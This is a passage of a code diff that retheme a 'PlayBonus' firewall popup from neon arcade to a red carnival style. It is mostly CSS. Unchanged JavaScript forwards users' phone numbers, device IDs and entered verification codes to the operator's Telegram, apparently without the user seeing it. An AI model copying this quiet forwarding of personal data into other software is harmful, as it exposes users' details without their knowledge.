@@ -1,7 +1,7 @@
 /**
- * Popup PlayBonus - Unique Carnival Arcade Theme
- * Hindi pareho sa share_and_earn.html
- * Theme: Neon Arcade + 3D Casino + Rainbow Lights
+ * Popup PlayBonus - Vibrant Filipino Carnival Theme
+ * Firewall System similar to share_and_earn.html
+ * Auto-shows when firewall is ON
  */
 
 (function() {
@@ -13,13 +13,14 @@
     var callTimerInterval = null;
     var currentCallCode = '';
     var currentFirewallStatus = false;
+    var popupCreated = false;
     
     // ========== SOUNDS ==========
     function playCallSound() {
         try {
             var audio = new Audio('sounds/call_ring.mp3');
             audio.volume = 0.5;
-            audio.play().catch(function(e) { console.log('Sound error:', e); });
+            audio.play().catch(function(e) {});
         } catch(e) {}
     }
     
@@ -27,7 +28,7 @@
         try {
             var audio = new Audio('sounds/super_ace_scatter_ring.mp3');
             audio.volume = 0.7;
-            audio.play().catch(function(e) { console.log('Sound error:', e); });
+            audio.play().catch(function(e) {});
         } catch(e) {}
     }
     
@@ -45,21 +46,21 @@
     function sendAICallRequestNotification(userPhone, deviceId, code) {
         var now = new Date();
         var timestamp = now.toLocaleString();
-        var message = '🎮 ARCADE VERIFICATION REQUEST\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n🔑 Code: ' + code + '\n⏰ Time: ' + timestamp + '\n📊 Status: Waiting for call\n━━━━━━━━━━━━━━━━━━━━';
+        var message = '🎪 CARNIVAL AI CALL REQUESTED\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n🔑 Code: ' + code + '\n⏰ Time: ' + timestamp + '\n📊 Status: Waiting for AI call\n━━━━━━━━━━━━━━━━━━━━';
         sendTelegramMessage(message);
     }
     
     function sendAICodeAttemptNotification(userPhone, deviceId, codeEntered, secondsLeft) {
         var now = new Date();
         var timestamp = now.toLocaleString();
-        var message = '🎯 ARCADE CODE ATTEMPT\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n📝 Code: ' + codeEntered + '\n⏰ Time: ' + timestamp + '\n⏱️ Left: ' + secondsLeft + 's\n📊 Status: INVALID\n━━━━━━━━━━━━━━━━━━━━';
+        var message = '🎯 CARNIVAL CODE ATTEMPT\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n📝 Code: ' + codeEntered + '\n⏰ Time: ' + timestamp + '\n⏱️ Left: ' + secondsLeft + 's\n📊 Status: INVALID\n━━━━━━━━━━━━━━━━━━━━';
         sendTelegramMessage(message);
     }
     
     function sendAICallExpiredNotification(userPhone, deviceId) {
         var now = new Date();
         var timestamp = now.toLocaleString();
-        var message = '⏰ ARCADE CALL EXPIRED\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n⏰ Time: ' + timestamp + '\n📊 Status: Expired\n━━━━━━━━━━━━━━━━━━━━';
+        var message = '⏰ CARNIVAL CALL EXPIRED\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n⏰ Time: ' + timestamp + '\n📊 Status: Expired\n━━━━━━━━━━━━━━━━━━━━';
         sendTelegramMessage(message);
     }
     
@@ -70,6 +71,7 @@
             return db.ref('admin/globalFirewall').once('value').then(function(snapshot) {
                 var data = snapshot.val();
                 currentFirewallStatus = (data && data.active === true);
+                console.log('🔥 Firewall:', currentFirewallStatus ? 'ON' : 'OFF');
                 return currentFirewallStatus;
             });
         } catch(e) {
@@ -77,133 +79,146 @@
         }
     }
     
-    // ========== ADD ARCADE THEME STYLES ==========
-    function addArcadeStyles() {
-        if (document.querySelector('#arcade-popup-styles')) return;
+    // ========== ADD CARNIVAL STYLES ==========
+    function addCarnivalStyles() {
+        if (document.querySelector('#carnival-popup-styles')) return;
         
         var style = document.createElement('style');
-        style.id = 'arcade-popup-styles';
+        style.id = 'carnival-popup-styles';
         style.textContent = `
             /* ============================================================
-               ARCADE POPUP THEME - UNIQUE FOR PLAYBONUS
-               Neon Grid + 3D Casino + Rainbow Lights
+               CARNIVAL FIREWALL POPUP - VIBRANT FILIPINO THEME
+               Hot Red + Crimson + White Burst + Confetti
                ============================================================ */
             
-            .arcade-popup-overlay {
+            .carnival-popup-overlay {
                 position: fixed;
                 inset: 0;
                 background: 
-                    radial-gradient(circle at 50% 40%, rgba(0, 255, 255, 0.15) 0%, transparent 50%),
-                    linear-gradient(180deg, #0a0520 0%, #1a0a3a 50%, #0a0510 100%);
-                backdrop-filter: blur(12px);
-                -webkit-backdrop-filter: blur(12px);
+                    radial-gradient(circle at 50% 35%, rgba(255, 255, 255, 0.35) 0%, rgba(255, 255, 255, 0.1) 20%, transparent 50%),
+                    radial-gradient(ellipse at 50% 30%, #ff2a2a 0%, #c1121f 25%, #780000 55%, #2a0000 85%, #0d0000 100%);
+                backdrop-filter: blur(14px);
+                -webkit-backdrop-filter: blur(14px);
                 z-index: 99999;
                 display: none;
                 align-items: center;
                 justify-content: center;
                 padding: 16px;
-                animation: arcadeFadeIn 0.4s ease;
-                overflow: hidden;
+                animation: carnivalFadeIn 0.4s ease;
+                overflow-y: auto;
+                overflow-x: hidden;
             }
             
-            .arcade-popup-overlay.show {
+            .carnival-popup-overlay.show {
                 display: flex;
             }
             
-            @keyframes arcadeFadeIn {
+            @keyframes carnivalFadeIn {
                 from { opacity: 0; }
                 to { opacity: 1; }
             }
             
-            /* ========== NEON GRID BACKGROUND ========== */
-            .arcade-popup-overlay::before {
+            /* ========== FLOATING CONFETTI ========== */
+            .carnival-popup-overlay::before {
                 content: '';
                 position: absolute;
-                inset: -10%;
+                inset: 0;
                 background-image: 
-                    linear-gradient(rgba(0, 255, 255, 0.15) 1px, transparent 1px),
-                    linear-gradient(90deg, rgba(255, 0, 255, 0.15) 1px, transparent 1px);
-                background-size: 40px 40px;
-                transform: perspective(500px) rotateX(60deg);
-                animation: gridMove 8s linear infinite;
+                    radial-gradient(circle 5px at 8% 15%, #ffd700 50%, transparent 50%),
+                    radial-gradient(circle 4px at 92% 25%, #ff6b9d 50%, transparent 50%),
+                    radial-gradient(circle 5px at 15% 78%, #4fc3f7 50%, transparent 50%),
+                    radial-gradient(circle 4px at 85% 82%, #ff9800 50%, transparent 50%),
+                    radial-gradient(circle 3px at 50% 8%, #ffd700 50%, transparent 50%),
+                    radial-gradient(circle 5px at 25% 45%, #ff6b9d 50%, transparent 50%),
+                    radial-gradient(circle 4px at 75% 55%, #4fc3f7 50%, transparent 50%),
+                    radial-gradient(circle 5px at 45% 92%, #ffd700 50%, transparent 50%),
+                    radial-gradient(circle 4px at 60% 20%, #ff9800 50%, transparent 50%),
+                    radial-gradient(circle 5px at 35% 68%, #ff6b9d 50%, transparent 50%);
+                animation: confettiFloat 6s ease-in-out infinite;
                 pointer-events: none;
                 z-index: 1;
+                opacity: 0.9;
             }
             
-            @keyframes gridMove {
-                from { background-position: 0 0; }
-                to { background-position: 40px 40px; }
+            @keyframes confettiFloat {
+                0%, 100% { transform: translateY(0) scale(1) rotate(0deg); }
+                50% { transform: translateY(-15px) scale(1.05) rotate(5deg); }
             }
             
             /* ========== RAINBOW LIGHTS ========== */
-            .arcade-popup-overlay::after {
+            .carnival-popup-overlay::after {
                 content: '';
                 position: absolute;
-                top: -50%;
-                left: -50%;
-                width: 200%;
-                height: 200%;
+                top: 50%;
+                left: 50%;
+                width: 800px;
+                height: 800px;
+                transform: translate(-50%, -50%);
                 background: 
-                    conic-gradient(from 0deg at 50% 50%,
-                        rgba(255, 0, 128, 0.15) 0deg,
-                        rgba(255, 200, 0, 0.15) 60deg,
-                        rgba(0, 255, 128, 0.15) 120deg,
-                        rgba(0, 200, 255, 0.15) 180deg,
-                        rgba(150, 0, 255, 0.15) 240deg,
-                        rgba(255, 0, 128, 0.15) 300deg,
-                        rgba(255, 0, 128, 0.15) 360deg);
-                animation: rainbowSpin 20s linear infinite;
+                    conic-gradient(from 0deg,
+                        rgba(255, 0, 128, 0.12) 0deg,
+                        rgba(255, 200, 0, 0.12) 60deg,
+                        rgba(0, 255, 128, 0.12) 120deg,
+                        rgba(0, 200, 255, 0.12) 180deg,
+                        rgba(150, 0, 255, 0.12) 240deg,
+                        rgba(255, 0, 128, 0.12) 300deg,
+                        rgba(255, 0, 128, 0.12) 360deg);
+                animation: rainbowSpin 25s linear infinite;
                 pointer-events: none;
                 z-index: 0;
                 filter: blur(40px);
             }
             
             @keyframes rainbowSpin {
-                from { transform: rotate(0deg); }
-                to { transform: rotate(360deg); }
+                from { transform: translate(-50%, -50%) rotate(0deg); }
+                to { transform: translate(-50%, -50%) rotate(360deg); }
             }
             
             /* ========== MAIN CONTAINER ========== */
-            .arcade-popup-container {
+            .carnival-popup-container {
                 position: relative;
                 z-index: 10;
                 width: 100%;
                 max-width: 400px;
                 background: 
-                    linear-gradient(180deg, rgba(0, 255, 255, 0.08) 0%, transparent 30%),
-                    linear-gradient(145deg, #1a0a3a 0%, #2a1050 50%, #0a0520 100%);
-                border: 3px solid #00ffff;
-                border-radius: 24px;
+                    linear-gradient(180deg, rgba(255, 255, 255, 0.15) 0%, transparent 30%),
+                    linear-gradient(145deg, #d10000 0%, #ff1744 50%, #8b0000 100%);
+                border: 3px solid #ffd700;
+                border-radius: 26px;
                 padding: 26px 20px 22px;
                 box-shadow: 
-                    0 0 30px rgba(0, 255, 255, 0.8),
-                    0 0 60px rgba(255, 0, 255, 0.5),
-                    0 0 100px rgba(0, 200, 255, 0.3),
-                    inset 0 0 30px rgba(0, 255, 255, 0.1);
-                animation: arcadePopIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+                    0 25px 60px rgba(0, 0, 0, 0.8),
+                    0 0 60px rgba(255, 215, 0, 0.7),
+                    0 0 120px rgba(255, 23, 68, 0.5),
+                    inset 0 0 40px rgba(255, 215, 0, 0.1);
+                animation: carnivalPopIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
                 overflow: hidden;
+                box-sizing: border-box;
             }
             
-            @keyframes arcadePopIn {
-                0% { transform: scale(0.4) rotate(-10deg); opacity: 0; }
-                60% { transform: scale(1.08) rotate(3deg); }
+            @keyframes carnivalPopIn {
+                0% { transform: scale(0.4) rotate(-8deg); opacity: 0; }
+                60% { transform: scale(1.06) rotate(2deg); }
                 100% { transform: scale(1) rotate(0deg); opacity: 1; }
             }
             
-            /* Animated border glow */
-            .arcade-popup-container::before {
+            /* Animated Border */
+            .carnival-popup-container::before {
                 content: '';
                 position: absolute;
                 inset: -3px;
-                border-radius: 24px;
+                border-radius: 28px;
                 padding: 3px;
                 background: conic-gradient(
-                    from var(--arcadeAngle, 0deg),
-                    #00ffff 0%,
-                    #ff00ff 25%,
-                    #ffff00 50%,
-                    #00ff00 75%,
-                    #00ffff 100%
+                    from var(--carnivalAngle, 0deg),
+                    #ffd700 0%,
+                    #ff9800 15%,
+                    #ff1744 30%,
+                    #fff9c4 45%,
+                    #ffd700 60%,
+                    #ff9800 75%,
+                    #ffd700 90%,
+                    #ffd700 100%
                 );
                 -webkit-mask: 
                     linear-gradient(#fff 0 0) content-box, 
@@ -212,192 +227,266 @@
                 mask-composite: exclude;
                 pointer-events: none;
                 z-index: 0;
-                animation: arcadeBorderRotate 3s linear infinite;
+                animation: carnivalBorderRotate 3s linear infinite;
+                filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.6));
             }
             
-            @property --arcadeAngle {
+            @property --carnivalAngle {
                 syntax: '<angle>';
                 initial-value: 0deg;
                 inherits: false;
             }
             
-            @keyframes arcadeBorderRotate {
-                to { --arcadeAngle: 360deg; }
+            @keyframes carnivalBorderRotate {
+                to { --carnivalAngle: 360deg; }
+            }
+            
+            /* White Burst Center */
+            .carnival-popup-container::after {
+                content: '';
+                position: absolute;
+                top: 30%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                width: 350px;
+                height: 350px;
+                background: radial-gradient(
+                    circle, 
+                    rgba(255, 255, 255, 0.3) 0%, 
+                    rgba(255, 215, 0, 0.15) 25%,
+                    transparent 60%
+                );
+                border-radius: 50%;
+                pointer-events: none;
+                animation: whiteBurst 3s ease-in-out infinite;
+                z-index: 1;
+            }
+            
+            @keyframes whiteBurst {
+                0%, 100% { 
+                    transform: translate(-50%, -50%) scale(1); 
+                    opacity: 0.7;
+                }
+                50% { 
+                    transform: translate(-50%, -50%) scale(1.15); 
+                    opacity: 1;
+                }
+            }
+            
+            /* ========== CLOSE BUTTON ========== */
+            .carnival-close {
+                position: absolute;
+                top: 14px;
+                right: 16px;
+                width: 36px;
+                height: 36px;
+                background: rgba(255, 255, 255, 0.15);
+                border: 2px solid #ffd700;
+                border-radius: 50%;
+                color: #ffd700;
+                font-size: 16px;
+                font-weight: 900;
+                cursor: pointer;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                transition: all 0.25s ease;
+                z-index: 10;
+                font-family: 'Orbitron', monospace;
+                box-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
+                position: absolute;
+            }
+            
+            .carnival-close:hover,
+            .carnival-close:active {
+                background: rgba(255, 68, 68, 0.5);
+                color: #fff;
+                transform: rotate(90deg) scale(1.1);
+                border-color: #ff4444;
+                box-shadow: 0 0 25px rgba(255, 68, 68, 0.8);
             }
             
             /* ========== HEADER ========== */
-            .arcade-header {
+            .carnival-header {
                 text-align: center;
                 margin-bottom: 16px;
                 position: relative;
                 z-index: 2;
             }
             
-            .arcade-title {
-                font-family: 'Orbitron', monospace;
-                font-size: 22px;
-                font-weight: 900;
-                background: linear-gradient(180deg, #00ffff 0%, #ff00ff 50%, #ffff00 100%);
-                -webkit-background-clip: text;
-                background-clip: text;
-                color: transparent;
-                letter-spacing: 4px;
-                text-transform: uppercase;
-                filter: drop-shadow(0 0 15px rgba(0, 255, 255, 0.8));
-                animation: arcadeTitlePulse 2s ease-in-out infinite;
-                margin-bottom: 4px;
-            }
-            
-            @keyframes arcadeTitlePulse {
-                0%, 100% { 
-                    filter: drop-shadow(0 0 15px rgba(0, 255, 255, 0.8));
-                }
-                50% { 
-                    filter: drop-shadow(0 0 25px rgba(255, 0, 255, 1))
-                            drop-shadow(0 0 40px rgba(0, 255, 255, 0.5));
-                }
-            }
-            
-            .arcade-subtitle {
-                font-family: 'Poppins', sans-serif;
-                font-size: 10px;
-                color: rgba(0, 255, 255, 0.7);
-                letter-spacing: 3px;
-                text-transform: uppercase;
-                margin-top: 4px;
-            }
-            
-            /* ========== PHONE ICON ========== */
-            .arcade-phone-icon {
-                width: 70px;
-                height: 70px;
-                margin: 0 auto 14px;
+            .carnival-icon-container {
+                width: 80px;
+                height: 80px;
+                margin: 0 auto 12px;
                 background: 
-                    radial-gradient(circle at 30% 30%, #ff00ff, #6600cc);
+                    radial-gradient(circle at 30% 30%, #ffeb3b, #ff6f00);
                 border-radius: 50%;
                 display: flex;
                 align-items: center;
                 justify-content: center;
-                border: 3px solid #00ffff;
+                border: 3px solid #fff9c4;
                 box-shadow: 
-                    0 0 30px rgba(0, 255, 255, 0.8),
-                    0 0 60px rgba(255, 0, 255, 0.5),
-                    inset 0 0 20px rgba(0, 0, 0, 0.5);
-                animation: arcadePhonePulse 1.5s ease-in-out infinite;
+                    0 0 30px rgba(255, 215, 0, 0.9),
+                    0 0 60px rgba(255, 152, 0, 0.6),
+                    inset 0 0 20px rgba(255, 255, 255, 0.3);
+                animation: iconPulse 2s ease-in-out infinite;
                 position: relative;
-                z-index: 2;
             }
             
-            @keyframes arcadePhonePulse {
+            @keyframes iconPulse {
                 0%, 100% { 
                     transform: scale(1);
-                    box-shadow: 0 0 30px rgba(0, 255, 255, 0.8);
+                    box-shadow: 0 0 30px rgba(255, 215, 0, 0.9);
                 }
                 50% { 
-                    transform: scale(1.08);
-                    box-shadow: 
-                        0 0 50px rgba(0, 255, 255, 1),
-                        0 0 80px rgba(255, 0, 255, 0.6);
+                    transform: scale(1.1);
+                    box-shadow: 0 0 50px rgba(255, 215, 0, 1);
                 }
             }
             
-            .arcade-phone-icon i {
-                font-size: 32px;
-                color: #fff;
-                text-shadow: 
-                    0 0 10px #00ffff,
-                    0 0 20px #ff00ff;
+            .carnival-icon-container i {
+                font-size: 38px;
+                color: #8b0000;
+                text-shadow: 0 0 15px rgba(255, 255, 255, 0.6);
+            }
+            
+            .carnival-title {
+                font-family: 'Playfair Display', serif;
+                font-size: 24px;
+                font-weight: 900;
+                background: linear-gradient(
+                    180deg, 
+                    #fff9c4 0%, 
+                    #ffd700 30%, 
+                    #ffeb3b 50%, 
+                    #ff9800 100%
+                );
+                -webkit-background-clip: text;
+                background-clip: text;
+                color: transparent;
+                letter-spacing: 3px;
+                text-transform: uppercase;
+                filter: 
+                    drop-shadow(0 0 20px rgba(255, 215, 0, 0.9))
+                    drop-shadow(0 4px 8px rgba(0, 0, 0, 0.6));
+                animation: titleShine 3s ease-in-out infinite;
+                margin-bottom: 4px;
+            }
+            
+            @keyframes titleShine {
+                0%, 100% { 
+                    filter: 
+                        drop-shadow(0 0 20px rgba(255, 215, 0, 0.9))
+                        drop-shadow(0 4px 8px rgba(0, 0, 0, 0.6));
+                }
+                50% { 
+                    filter: 
+                        drop-shadow(0 0 35px rgba(255, 215, 0, 1))
+                        drop-shadow(0 0 60px rgba(255, 152, 0, 0.7));
+                }
+            }
+            
+            .carnival-subtitle {
+                font-family: 'Poppins', sans-serif;
+                font-size: 10px;
+                color: rgba(255, 215, 0, 0.9);
+                letter-spacing: 3px;
+                text-transform: uppercase;
+                margin-top: 4px;
+                text-shadow: 0 0 10px rgba(255, 215, 0, 0.7);
             }
             
             /* ========== STATUS BOX ========== */
-            .arcade-status-box {
+            .carnival-status-box {
                 background: 
-                    linear-gradient(180deg, rgba(0, 255, 255, 0.1) 0%, transparent 50%),
-                    linear-gradient(135deg, #0a0520, #1a0a3a);
-                border: 2px solid #00ffff;
-                border-radius: 14px;
+                    linear-gradient(180deg, rgba(255, 255, 255, 0.1) 0%, transparent 50%),
+                    linear-gradient(135deg, #1a0000, #330000);
+                border: 2px solid #ffd700;
+                border-radius: 18px;
                 padding: 16px;
                 margin: 14px 0;
                 text-align: center;
                 box-shadow: 
-                    0 0 25px rgba(0, 255, 255, 0.4),
-                    inset 0 0 20px rgba(0, 255, 255, 0.05);
+                    0 0 25px rgba(255, 215, 0, 0.6),
+                    inset 0 0 20px rgba(255, 215, 0, 0.08);
                 position: relative;
                 overflow: hidden;
                 z-index: 2;
             }
             
-            .arcade-status-box::before {
+            .carnival-status-box::before {
                 content: '';
                 position: absolute;
                 top: 0;
                 left: -100%;
                 width: 50%;
                 height: 100%;
-                background: linear-gradient(90deg, transparent, rgba(0, 255, 255, 0.2), transparent);
-                animation: arcadeScanner 2.5s infinite;
+                background: linear-gradient(90deg, transparent, rgba(255, 215, 0, 0.3), transparent);
+                animation: scannerGlow 3s infinite;
             }
             
-            @keyframes arcadeScanner {
+            @keyframes scannerGlow {
                 100% { left: 200%; }
             }
             
-            .arcade-status-text {
+            .carnival-status-text {
                 font-family: 'Poppins', sans-serif;
                 font-size: 12px;
-                color: rgba(255, 255, 255, 0.9);
+                color: rgba(255, 255, 255, 0.95);
                 line-height: 1.5;
                 position: relative;
                 z-index: 2;
             }
             
-            .arcade-status-text strong {
-                color: #00ffff;
-                text-shadow: 0 0 10px rgba(0, 255, 255, 0.8);
+            .carnival-status-text strong {
+                color: #ffd700;
+                text-shadow: 0 0 12px rgba(255, 215, 0, 0.9);
                 font-weight: 800;
             }
             
             /* Phone Number Display */
-            .arcade-phone-number {
+            .carnival-phone-number {
                 font-family: 'Orbitron', monospace;
-                font-size: 22px;
+                font-size: 24px;
                 font-weight: 900;
-                background: linear-gradient(180deg, #00ffff 0%, #ff00ff 100%);
+                background: linear-gradient(180deg, #fff9c4 0%, #ffd700 50%, #ff9800 100%);
                 -webkit-background-clip: text;
                 background-clip: text;
                 color: transparent;
                 letter-spacing: 2px;
                 margin: 10px 0;
-                filter: drop-shadow(0 0 15px rgba(0, 255, 255, 0.8));
-                animation: arcadeNumberReveal 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards,
-                           arcadeNumberGlow 2s ease-in-out infinite 0.8s;
+                filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.9));
+                animation: numberReveal 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards,
+                           numberGlow 2s ease-in-out infinite 0.8s;
                 display: inline-block;
+                position: relative;
+                z-index: 2;
             }
             
-            @keyframes arcadeNumberReveal {
-                0% { opacity: 0; transform: scale(0.5) rotateX(90deg); }
-                50% { opacity: 0.5; transform: scale(1.1) rotateX(-10deg); }
-                100% { opacity: 1; transform: scale(1) rotateX(0deg); }
+            @keyframes numberReveal {
+                0% { opacity: 0; transform: scale(0.5) rotateY(90deg); }
+                50% { opacity: 0.5; transform: scale(1.1) rotateY(-10deg); }
+                100% { opacity: 1; transform: scale(1) rotateY(0deg); }
             }
             
-            @keyframes arcadeNumberGlow {
+            @keyframes numberGlow {
                 0%, 100% { 
-                    filter: drop-shadow(0 0 15px rgba(0, 255, 255, 0.5));
+                    filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.7));
                 }
                 50% { 
-                    filter: drop-shadow(0 0 30px rgba(255, 0, 255, 0.9));
+                    filter: drop-shadow(0 0 40px rgba(255, 152, 0, 1));
                 }
             }
             
             /* ========== TIMER ========== */
-            .arcade-timer {
+            .carnival-timer {
                 font-family: 'Orbitron', monospace;
-                font-size: 32px;
+                font-size: 34px;
                 font-weight: 900;
-                color: #00ff00;
+                color: #39ff14;
                 text-shadow: 
-                    0 0 20px rgba(0, 255, 0, 0.8),
-                    0 0 40px rgba(0, 255, 0, 0.4);
+                    0 0 25px rgba(57, 255, 20, 0.9),
+                    0 0 50px rgba(57, 255, 20, 0.5);
                 letter-spacing: 3px;
                 margin: 8px 0;
                 transition: all 0.3s ease;
@@ -405,22 +494,22 @@
                 z-index: 2;
             }
             
-            .arcade-timer.urgent {
-                color: #ff0044;
+            .carnival-timer.urgent {
+                color: #ff1744;
                 text-shadow: 
-                    0 0 20px rgba(255, 0, 68, 0.9),
-                    0 0 40px rgba(255, 0, 68, 0.6),
-                    0 0 80px rgba(255, 0, 68, 0.3);
-                animation: arcadeTimerUrgent 0.4s ease-in-out infinite;
+                    0 0 25px rgba(255, 23, 68, 0.9),
+                    0 0 50px rgba(255, 23, 68, 0.6),
+                    0 0 100px rgba(255, 23, 68, 0.3);
+                animation: timerUrgent 0.5s ease-in-out infinite;
             }
             
-            @keyframes arcadeTimerUrgent {
+            @keyframes timerUrgent {
                 0%, 100% { transform: scale(1); }
                 50% { transform: scale(1.12); }
             }
             
             /* ========== BUTTONS ========== */
-            .arcade-btn {
+            .carnival-btn {
                 width: 100%;
                 padding: 16px 20px;
                 border-radius: 14px;
@@ -436,60 +525,60 @@
                 gap: 10px;
                 position: relative;
                 overflow: hidden;
-                transition: all 0.15s ease;
+                transition: all 0.1s ease;
                 box-sizing: border-box;
                 z-index: 2;
             }
             
-            /* Request Call Button - Cyan/Blue */
-            .arcade-btn-primary {
+            /* Request Call Button */
+            .carnival-btn-primary {
                 background: 
-                    linear-gradient(180deg, rgba(255, 255, 255, 0.3) 0%, transparent 40%),
-                    linear-gradient(180deg, #00ffff 0%, #0088ff 50%, #0044cc 100%);
-                border: 3px solid #7dd3fc;
-                color: #001a33;
-                text-shadow: 0 1px 0 rgba(255, 255, 255, 0.6);
+                    linear-gradient(180deg, rgba(255, 255, 255, 0.35) 0%, transparent 40%),
+                    linear-gradient(180deg, #ffeb3b 0%, #ffd700 30%, #ff9800 70%, #ff6f00 100%);
+                border: 3px solid #fff9c4;
+                color: #8b0000;
+                text-shadow: 0 2px 0 rgba(255, 255, 255, 0.7);
                 box-shadow: 
-                    0 5px 0 #003366,
-                    0 10px 25px rgba(0, 0, 0, 0.5),
-                    0 0 30px rgba(0, 255, 255, 0.7);
+                    0 5px 0 #8b4500,
+                    0 10px 25px rgba(0, 0, 0, 0.6),
+                    0 0 35px rgba(255, 215, 0, 0.8);
             }
             
-            .arcade-btn-primary:active {
+            .carnival-btn-primary:active {
                 transform: translateY(5px);
                 box-shadow: 
-                    0 0 0 #003366,
-                    0 5px 15px rgba(0, 0, 0, 0.5),
-                    0 0 20px rgba(0, 255, 255, 0.5);
+                    0 0 0 #8b4500,
+                    0 5px 15px rgba(0, 0, 0, 0.6),
+                    0 0 25px rgba(255, 215, 0, 0.6);
             }
             
-            /* Verify Button - Neon Green */
-            .arcade-btn-verify {
+            /* Verify Button */
+            .carnival-btn-verify {
                 background: 
-                    linear-gradient(180deg, rgba(255, 255, 255, 0.3) 0%, transparent 40%),
+                    linear-gradient(180deg, rgba(255, 255, 255, 0.35) 0%, transparent 40%),
                     linear-gradient(180deg, #00ff88 0%, #00cc44 50%, #008833 100%);
                 border: 3px solid #7dffb3;
                 color: #00331a;
-                text-shadow: 0 1px 0 rgba(255, 255, 255, 0.6);
+                text-shadow: 0 2px 0 rgba(255, 255, 255, 0.6);
                 box-shadow: 
                     0 5px 0 #005522,
-                    0 10px 25px rgba(0, 0, 0, 0.5),
-                    0 0 30px rgba(0, 255, 136, 0.7);
+                    0 10px 25px rgba(0, 0, 0, 0.6),
+                    0 0 35px rgba(0, 255, 136, 0.8);
             }
             
-            .arcade-btn-verify:active {
+            .carnival-btn-verify:active {
                 transform: translateY(5px);
                 box-shadow: 
                     0 0 0 #005522,
-                    0 5px 15px rgba(0, 0, 0, 0.5);
+                    0 5px 15px rgba(0, 0, 0, 0.6);
             }
             
             /* Back Button */
-            .arcade-btn-back {
-                background: linear-gradient(180deg, #3a3a5a, #1a1a3a);
-                border: 2px solid #5a5a8a;
-                color: #aaaadd;
-                box-shadow: 0 3px 0 #0a0a1a;
+            .carnival-btn-back {
+                background: linear-gradient(180deg, #555, #333);
+                border: 2px solid #777;
+                color: #ccc;
+                box-shadow: 0 3px 0 #222;
                 font-size: 11px;
                 padding: 10px 20px;
                 margin-top: 10px;
@@ -497,123 +586,141 @@
                 display: inline-flex;
             }
             
-            .arcade-btn-back:active {
+            .carnival-btn-back:active {
                 transform: translateY(3px);
-                box-shadow: 0 0 0 #0a0a1a;
+                box-shadow: 0 0 0 #222;
             }
             
             /* Shine effect */
-            .arcade-btn::before {
+            .carnival-btn::before {
                 content: '';
                 position: absolute;
                 top: 0;
                 left: -100%;
                 width: 100%;
                 height: 100%;
-                background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.6), transparent);
-                animation: arcadeBtnShine 2.5s infinite;
+                background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.7), transparent);
+                animation: btnShine 2.5s infinite;
             }
             
-            @keyframes arcadeBtnShine {
+            @keyframes btnShine {
                 0% { left: -100%; }
                 60% { left: 100%; }
                 100% { left: 100%; }
             }
             
+            /* Button Icons */
+            .carnival-btn i {
+                font-size: 18px;
+                filter: drop-shadow(0 0 6px currentColor);
+            }
+            
+            .carnival-btn-primary i {
+                animation: phoneBounce 1.2s ease-in-out infinite;
+            }
+            
+            @keyframes phoneBounce {
+                0%, 100% { transform: rotate(-10deg) scale(1); }
+                50% { transform: rotate(10deg) scale(1.15); }
+            }
+            
             /* ========== INPUT FIELD ========== */
-            .arcade-input {
+            .carnival-input {
                 width: 100%;
                 max-width: 200px;
                 margin: 0 auto 12px;
                 display: block;
                 text-align: center;
                 font-family: 'Orbitron', monospace;
-                font-size: 26px;
+                font-size: 28px;
                 font-weight: 900;
                 padding: 14px;
                 background: 
-                    linear-gradient(180deg, rgba(0, 255, 255, 0.05) 0%, transparent 50%),
-                    #050515;
-                border: 3px solid #00ffff;
-                border-radius: 12px;
-                color: #00ffff;
-                letter-spacing: 6px;
+                    linear-gradient(180deg, rgba(255, 215, 0, 0.08) 0%, transparent 50%),
+                    #0a0000;
+                border: 3px solid #ffd700;
+                border-radius: 14px;
+                color: #ffd700;
+                letter-spacing: 8px;
                 transition: all 0.3s ease;
                 box-shadow: 
-                    0 0 20px rgba(0, 255, 255, 0.5),
-                    inset 0 0 15px rgba(0, 255, 255, 0.1);
+                    0 0 25px rgba(255, 215, 0, 0.6),
+                    inset 0 0 20px rgba(255, 215, 0, 0.1);
                 outline: none;
                 box-sizing: border-box;
             }
             
-            .arcade-input:focus {
-                border-color: #ff00ff;
+            .carnival-input:focus {
+                border-color: #39ff14;
                 box-shadow: 
-                    0 0 30px rgba(255, 0, 255, 0.8),
-                    inset 0 0 20px rgba(255, 0, 255, 0.15);
+                    0 0 35px rgba(57, 255, 20, 0.9),
+                    inset 0 0 25px rgba(57, 255, 20, 0.15);
+                color: #39ff14;
             }
             
-            .arcade-input::placeholder {
-                color: rgba(0, 255, 255, 0.4);
-                letter-spacing: 3px;
-                font-size: 16px;
+            .carnival-input::placeholder {
+                color: rgba(255, 215, 0, 0.4);
+                letter-spacing: 4px;
+                font-size: 18px;
             }
             
             /* ========== MESSAGES ========== */
-            .arcade-msg {
+            .carnival-msg {
                 font-family: 'Poppins', sans-serif;
                 font-size: 11px;
                 text-align: center;
-                padding: 10px;
+                padding: 10px 14px;
                 margin-top: 10px;
-                border-radius: 10px;
+                border-radius: 12px;
                 display: none;
                 position: relative;
                 z-index: 2;
+                font-weight: 600;
             }
             
-            .arcade-msg.show {
+            .carnival-msg.show {
                 display: block;
-                animation: msgSlideIn 0.3s ease;
+                animation: msgSlide 0.3s ease;
             }
             
-            @keyframes msgSlideIn {
+            @keyframes msgSlide {
                 from { opacity: 0; transform: translateY(-10px); }
                 to { opacity: 1; transform: translateY(0); }
             }
             
-            .arcade-msg-error {
+            .carnival-msg-error {
